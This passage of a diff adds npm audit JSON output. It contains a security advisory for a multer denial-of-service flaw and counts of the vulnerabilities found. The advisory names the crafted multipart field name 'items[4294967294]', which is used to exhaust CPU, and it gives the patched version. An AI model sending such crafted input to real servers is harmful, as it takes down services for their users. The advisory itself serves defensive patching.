+      "references": "- https://github.com/expressjs/multer/security/advisories/GHSA-535w-7cp7-47q4\n- https://nvd.nist.gov/vuln/detail/CVE-2026-82333\n- https://github.com/expressjs/multer/pull/1438\n- https://github.com/expressjs/multer/commit/73c1759fa93b87366bc6dbd7abe1b80ddff7d27c\n- https://cna.openjsf.org/security-advisories.html\n- https://github.com/expressjs/multer/releases/tag/v2.3.0\n- https://github.com/advisories/GHSA-535w-7cp7-47q4",
+      "created": "2026-09-08T21:28:43.000Z",
+      "id": 1193793,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nmulter is vulnerable to a Denial of Service (DoS) via a crafted array index in multipart field names. The `append-field` dependency parses bracket notation in field names, and a large numeric index such as `items[4294967294]` forces allocation of a maximum-length sparse array. A following field with a non-numeric key on the same base then converts that array to an object by iterating its full length, which consumes CPU synchronously and leaves the process unable to handle other requests. A single HTTP request with a crafted multipart body is sufficient to exploit this, and it affects multer 1.x and 2.x.\n\n### Patches\n\nUsers should upgrade to `2.3.0` and configure `limits.fieldArrayIndexLimit` to the minimum array index their application requires.\n\n### Workarounds\n\nNone.",
+      "reported_by": null,
+      "title": "multer vulnerable to Denial of Service via oversized array index in field names",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-82333"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "multer",
+      "vulnerable_versions": "<2.3.0",
+      "github_advisory_id": "GHSA-535w-7cp7-47q4",
+      "recommendation": "Upgrade to version 2.3.0 or later",
+      "patched_versions": ">=2.3.0",
+      "updated": "2026-09-08T21:28:45.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-400"
+      ],
+      "url": "https://github.com/advisories/GHSA-535w-7cp7-47q4"
+    }
+  },
+  "muted": [],
+  "metadata": {
+    "vulnerabilities": {
+      "info": 0,
+      "low": 1,
+      "moderate": 7,
+      "high": 15,
+      "critical": 0
+    },
+    "dependencies": 352,
+    "devDependencies": 0,
+    "optionalDependencies": 0,
+    "totalDependencies": 352
+  }
+}
